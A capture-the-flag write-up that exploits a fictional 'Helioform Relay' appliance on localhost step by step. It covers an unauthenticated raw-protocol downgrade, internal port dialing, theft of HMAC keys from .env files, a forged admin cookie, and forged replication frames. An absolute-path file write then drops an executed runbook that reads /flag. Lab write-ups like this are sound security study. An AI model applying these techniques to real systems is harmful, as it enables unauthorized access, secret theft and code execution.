# Helioform Relay

I had the web port and nothing else. No binary, no source, no client. The challenge text says the flag file on the appliance is `/flag`. I solved it against `http://127.0.0.1:18080/`.

Nothing on the first page is a socket, a port, or a key. The two links are the protocol notes and a login form.

![Site overview](screenshots/01-overview.png)

## The login is not the way in

`admin` / `admin` comes back as invalid credentials. There is no error oracle, no lockout message, and no default password anywhere on the site.

![Failed operator login](screenshots/04-login-fail.png)

The login page points at the session notes. Those describe a factory cookie and then say the signing key is not in the document.

![Session notes, with no key](screenshots/03-session.png)

```text
cookie      hsp_session
value       payload_b64.mac_hex
payload     base64url(JSON), padding removed
json        iss, aud, role, exp
role        admin
mac         HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64) as lowercase hex
            the key is the literal environment string, not hex-decoded
iss, aud    must match the factory environment on this appliance
```

I saved that and stopped. Without `CONSOLE_MAC_KEY`, `iss`, and `aud`, the cookie cannot be minted. The password form is a decoy.

## The mesh document hides the second transport

`/docs/hsp` is a normal customer contract. Framing is little-endian. Magic is the four ASCII bytes `HSP1`, not an integer. A success reply repeats the request opcode with flags `0x0001`. An error is opcode `0x007F`.

![Mesh protocol notes](screenshots/02-protocol.png)

The customer opcodes are only these:

| opcode | name | body |
|--------|------|------|
| 0x01 | HELLO | optional client name |
| 0x02 | PING | empty |
| 0x03 | SUBSCRIBE | ignored |

One paragraph under that table is the part I almost skipped. Agents that cannot mask WebSocket frames request subprotocol `hsp.raw.1`. After the 101 the socket is raw HSP. The page says the edge authenticates an agent before it can open a channel, and that a normal client must not send `hsp.raw.1`.

I did not trust the paragraph until the server repeated it. A WebSocket upgrade with `Sec-WebSocket-Protocol: chat` is rejected and names both real subprotocols:

```text
HTTP/1.1 400 Bad Request
Server: helioform-relay/4.2
Content-Type: text/plain
Content-Length: 44

supported subprotocols: hsp.ws.1, hsp.raw.1
```

## The documented client cannot dial

I implemented the 12-byte header and spoke `hsp.ws.1` the way the page says: one HSP frame inside one masked binary WebSocket message.

```text
>> opcode=0x0001 HELLO  "field-laptop"
<< opcode=0x0001 flags=0x0001
hsp-edge/4.2 transport=websocket auth=session
commands=HELLO:0x01,PING:0x02,SUBSCRIBE:0x03

>> opcode=0x0002 PING
<< pong

>> opcode=0x0003 SUBSCRIBE  "north"
<< site=north kw=14.2
```

That is a telemetry toy. The banner's command list stops at `SUBSCRIBE`. I still sent opcode `0x10`, because "open a channel" had to be some opcode, and `0x10` is the first gap I tried past the documented three.

```text
>> opcode=0x0010  body=127.0.0.1:80
<< opcode=0x007f
err: scope edge.dial required
```

So `0x10` exists, and a customer session is never allowed to use it. Opcode `0x11` on the same socket is just `err: unknown opcode`. There is no login, no cookie, and no header on this WebSocket that grants `edge.dial`. I stopped trying to authenticate the customer transport.

## Raw is a different service on the same URL

Same upgrade, subprotocol `hsp.raw.1`. The 101 still happens. After that I do not send WebSocket frames. The next bytes are naked HSP.

```text
$ GET /mesh
Sec-WebSocket-Protocol: hsp.raw.1

HTTP/1.1 101 Switching Protocols
Sec-WebSocket-Protocol: hsp.raw.1

>> opcode=0x0001 HELLO  "agent"
<< opcode=0x0001 flags=0x0001 len=134
hsp-edge/4.2 transport=raw auth=legacy-proxy
commands=HELLO:0x01,PING:0x02,DIAL:0x10
dial=host:port
dial-ack=splices
egress=127.0.0.1
```

```text
0000  68 73 70 2d 65 64 67 65 2f 34 2e 32 20 74 72 61   hsp-edge/4.2 tra
0010  6e 73 70 6f 72 74 3d 72 61 77 20 61 75 74 68 3d   nsport=raw auth=
0020  6c 65 67 61 63 79 2d 70 72 6f 78 79 0a 63 6f 6d   legacy-proxy.com
0030  6d 61 6e 64 73 3d 48 45 4c 4c 4f 3a 30 78 30 31   mands=HELLO:0x01
0040  2c 50 49 4e 47 3a 30 78 30 32 2c 44 49 41 4c 3a   ,PING:0x02,DIAL:
0050  30 78 31 30 0a 64 69 61 6c 3d 68 6f 73 74 3a 70   0x10.dial=host:p
0060  6f 72 74 0a 64 69 61 6c 2d 61 63 6b 3d 73 70 6c   ort.dial-ack=spl
0070  69 63 65 73 0a 65 67 72 65 73 73 3d 31 32 37 2e   ices.egress=127.
0080  30 2e 30 2e 31 0a                                 0.0.1.
```

The customer banner said `auth=session` and did not list `DIAL`. This banner says `auth=legacy-proxy` and lists `DIAL:0x10`. The page claimed an agent is authenticated before it can open a channel. Nothing in the upgrade asked me for a credential. I sent `DIAL` anyway.

```text
>> opcode=0x0010  8.8.8.8:53
<< err: egress denied

>> opcode=0x0010  127.0.0.1:80
<< err: dial failed

>> opcode=0x0010  127.0.0.1:443
<< err: dial failed

>> opcode=0x0010  localhost:7710
<< err: egress denied

>> opcode=0x0010  not-a-target
<< err: dial target required (host:port)
```

`localhost` is not `127.0.0.1`. The egress check is a string compare. `dial failed` means the TCP connect was refused, which is different from `egress denied`. A refused port is still a useful oracle. `ok splice` would mean the edge has glued my socket to whatever answered.

## Finding the listeners

I dialed `127.0.0.1` on 22, 80, 443, 1337, 3000, 8080, and every port from 7600 through 7740. One hundred forty-two of those came back `err: dial failed`. Five spliced:

```text
open ports: 8080, 7710, 7711, 7712, 7713
```

`8080` is the public web server I was already using. I ignored it. The other four do not speak HTTP. `7710` was the first one that answered `HELLO` with a service directory instead of an error.

```text
>> DIAL 127.0.0.1:7710
<< opcode=0x0010 flags=0x0001
ok splice

>> HELLO
<< opcode=0x0001 flags=0x0001 len=260
nonce=9f92df840fe847ddedd4c64febe52a3b
ticket_opcode=0x20
ticket_body=nonce
export_opcode=0x30
export_fields=ticket,path
status_opcode=0x40
status_fields=ticket
body=key=value lines
services:
127.0.0.1:7710 catalogd
127.0.0.1:7711 provd
127.0.0.1:7712 recordd
```

The directory does not mention `7713`. I left that port alone until something else named it. Ticket opcode `0x20` wants the nonce as the raw body, not a `key=value` line.

```text
>> opcode=0x0020
9f92df840fe847ddedd4c64febe52a3b

<< opcode=0x0020
ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
ttl=600
```

Ten minutes. I used the same ticket for the other two services.

## provd will not open the flag

`7711` is `provd`. Export is opcode `0x30`. The catalog said the body is `key=value` lines and the fields are `ticket` and `path`. I asked for `/flag` first.

```text
>> opcode=0x0030
ticket=tkt.9f92df840fe847ddedd4c64febe52a3b.5928fdca6c64c7c6cc8dea0983224a0a
path=/flag

<< err: dotenv loader refuses non-env path
```

`/etc/passwd` is the same refusal. The loader is not a file read. The path has to end in `.env`.

The next errors split into two. These are outside whatever directory it is willing to touch:

```text
path=/.env                              err: path outside provision root
path=/etc/.env                          err: path outside provision root
path=/opt/helioform/relay.env           err: path outside provision root
path=/var/lib/helioform/.env            err: path outside provision root
```

`/etc/helioform/.env` changed the error:

```text
<< err: no such env file
```

Same suffix, and now it is looking the file up instead of rejecting the directory. The product name on every page is Helioform Relay, so the basename I tried next was `relay.env`.

```text
>> path=/etc/helioform/relay.env
<< opcode=0x0030 flags=0x0001 len=397
# Helioform Relay factory environment. Written by the appliance provisioner.
# The console verifier and the replication MAC both fall back to these values
# when the site has not been moved to the hardware keystore.
CONSOLE_MAC_KEY=7f3c9a2e1b84d056a0c3e91f44b7d2aa
CONSOLE_ISS=helioform-factory
CONSOLE_AUD=relay-console
REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
MESH_CAPTURE_ENABLED=1
```

The flag is not in there. A second name in the same directory, `collector.env`, is a different file. `nope.env` is `err: no such env file`, so this is not a directory listing. I only got the files I could name.

```text
# Identity the site collector presents on the replication port.
COLLECTOR_PEER=relay-collector
COLLECTOR_INTERVAL_SEC=5
LOG_ROOT=/var/log/helioform/streams
SITE_ID=north
```

`REPLICATION_MAC_KEY` is not in the collector file. The peer name and the log root are.

## recordd will not take a write

`7712` is the status port from the catalog. Opcode `0x40`, one line, `ticket=`.

```text
<< opcode=0x0040
epoch=7
tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640
bind=d70e37a4a0ea69726232246e6bde2c8c
repl_port=7713
write=peer-only
```

That is where `7713` comes from. I dialed it and sent a normal `HELLO`.

```text
>> DIAL 127.0.0.1:7713
<< ok splice
>> opcode=0x0001
<< err: peer handshake required

>> opcode=0x0017  body=hello
<< err: peer hello required
```

`0x17` is recognized and still refused. The mesh ticket does nothing here. I stopped guessing frame layouts. The status text says writes are peer-only, and I still did not know what a peer frame looked like.

## The cookie, then two pages I could not see before

The session notes are now fill-in-the-blank. JSON fields in the order the page lists them, compact, `role` of `admin`, `exp` an hour ahead. HMAC-SHA256 over the unpadded base64url payload, key used as the ASCII string from the environment file.

```text
{"iss":"helioform-factory","aud":"relay-console","role":"admin","exp":1791909545}
```

```text
eyJpc3MiOiJoZWxpb2Zvcm0tZmFjdG9yeSIsImF1ZCI6InJlbGF5LWNvbnNvbGUiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3OTE5MDk1NDV9.533d7a383b6970a4ea62dd3ff864262cd45e18639cd59f16e535439986755f37
```

A cookie with a zeroed MAC is rejected:

```text
$ GET /console/automation
Cookie: hsp_session=<payload>.0000...0000
HTTP 401 Unauthorized
Authentication required
```

The real MAC is accepted. `/console/login` still shows the form. `/console` is the page behind it.

![Mesh operator, after the forged cookie](screenshots/05-console.png)

Two links: Peer trace and Runbooks. Runbooks is the one that mentions execution.

![Runbooks, before anything has run](screenshots/06-runbooks-idle.png)

```text
Directory   /var/lib/helioform/runbooks
Header      HSP-RUNBOOK
Interval    5s, and whenever a new file is written
Last output idle
```

A file dropped in that directory, starting with the line `HSP-RUNBOOK`, is executed as the relay user. I could not write that directory from the console. The log root from `collector.env` is a different path, `/var/log/helioform/streams`.

## The trace is the replication grammar

`POST /console/trace` arms a capture. The first `GET` was only the decoder. A second later the collector had talked to `recordd`, and the frames showed up. The cluster key is not on the page. The string the MAC is computed over is.

![Peer trace with one live collector exchange](screenshots/07-peer-trace.png)

```text
inspector: hsp-repl/1
mac: HMAC-SHA256 over mac_canonical, key is the replication cluster key, digest lowercase hex
integers on the wire are little-endian
tip is 32 raw bytes; bind is 16 raw bytes; mac is 32 raw bytes

peer hello body: u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
hello mac_canonical = hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}

commit blob body: u16 stream_len | stream_id | u8 mode | u32 epoch | tip[32] | bind[16] | u32 body_len | body | mac[32]
mode 0x01 replaces the resolved stream file with body
blob mac_canonical = hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha256}
body_sha256 = lowercase hex SHA-256 of the raw body
```

The live half of that screenshot:

```text
opcode=0x0011
mac_canonical=hsp-repl/1|hello|7|47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640|relay-collector
peer=relay-collector
epoch=7
tip=47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640

opcode=0x0017
mac_canonical=hsp-repl/1|blob|7|47a237fede22de258c6ae30e9ffe7fdca76d7c8b1f16a8325f84100699c59640|d70e37a4a0ea69726232246e6bde2c8c|site-north-inverter-14.log|6c588e093ab300528bc08fdc2007a51598adfb1e9a58c79a42d78ad08c919717
stream_id=site-north-inverter-14.log
mode=0x01
body_sha256=6c588e093ab300528bc08fdc2007a51598adfb1e9a58c79a42d78ad08c919717
resolved=/var/log/helioform/streams/site-north-inverter-14.log
```

Opcode `0x11` is the hello I did not previously know. Opcode `0x17` is the blob. The peer string matches `COLLECTOR_PEER`. The resolved path matches `LOG_ROOT` plus the stream id. `bind` is a field I had already seen on the status port, and it is mixed into the blob canonical. The key for the HMAC is `REPLICATION_MAC_KEY` from `relay.env`.

I built a hello with the right layout and a MAC of `0x11` bytes. The opcode was accepted and the MAC was not:

```text
>> opcode=0x0011  peer=relay-collector epoch=7 tip=<from status> mac=11*32
<< err: bad mac
```

Copying the tip out of the trace is also wrong. The collector commits every five seconds, and the tip moves. I read status, waited six seconds, read status again, and sent a hello signed over the first tip:

```text
FRESH a8a5a0feba6f8b1886806b64be091ceadec9736b09ce44f78c9a3a0f037b7500
LATER 8de5fb0099841d14330155bbf5b9630c161d1845f8f508442f23d7ba35246616

>> opcode=0x0011  signed over the FRESH tip
<< err: stale tip
```

The canonical has to be rebuilt from a status read taken immediately before the replication dial. `epoch`, `tip`, and `bind` all come from that read. The trace is only the grammar.

## The log path is not stuck under the log root

A correct hello is opcode `0x11`. On that same spliced socket, opcode `0x17` with mode byte `0x01`. I aimed the first blob at the runbook directory with a relative escape, because the trace resolves `site-north-inverter-14.log` under `/var/log/helioform/streams/`.

```text
canonical hello hsp-repl/1|hello|7|11822cd87bc9102e856382704268fc7c0dd52bc747a237e69623deb8f9df92bd|relay-collector
canonical blob  hsp-repl/1|blob|7|11822cd87bc9102e856382704268fc7c0dd52bc747a237e69623deb8f9df92bd|12eded5d6380fda2801b511136034eb9|../runbooks/intake.py|6facd026d35a951f52a46d5f68e3eef02ef443c8b99fd594d40686173d6b2f51

>> opcode=0x0011
<< ok

>> opcode=0x0017  stream_id=../runbooks/intake.py  mode=0x01
<< err: stream id rejected
```

`..` is checked. The stream id in the successful collector frame has no slash at all, and the resolved path is the log root joined in front of it. I sent the runbook directory as an absolute stream id instead of a suffix.

```text
>> opcode=0x0017
stream_id=/var/lib/helioform/runbooks/intake.py
mode=0x01
body=
HSP-RUNBOOK
import pathlib
print(pathlib.Path('/flag').read_text())

<< opcode=0x0017 flags=0x0001
ok path=/var/lib/helioform/runbooks/intake.py
```

```text
0000  25 00 2f 76 61 72 2f 6c 69 62 2f 68 65 6c 69 6f   %./var/lib/helio
0010  66 6f 72 6d 2f 72 75 6e 62 6f 6f 6b 73 2f 69 6e   form/runbooks/in
0020  74 61 6b 65 2e 70 79 01 ...                       take.py.
```

The `0x25 0x00` is the little-endian length of `/var/lib/helioform/runbooks/intake.py`. The `01` after the path is mode replace. The reply path is not under `/var/log/helioform/streams`. The absolute id replaced the log root.

The runbook page updates as soon as the file is written. Refresh `/console/automation`.

![Runbook output](screenshots/08-flag.png)

```text
flag{hsp_raw_d0wngrade_pr0xy_dial_env_t4p_runb00k}
```
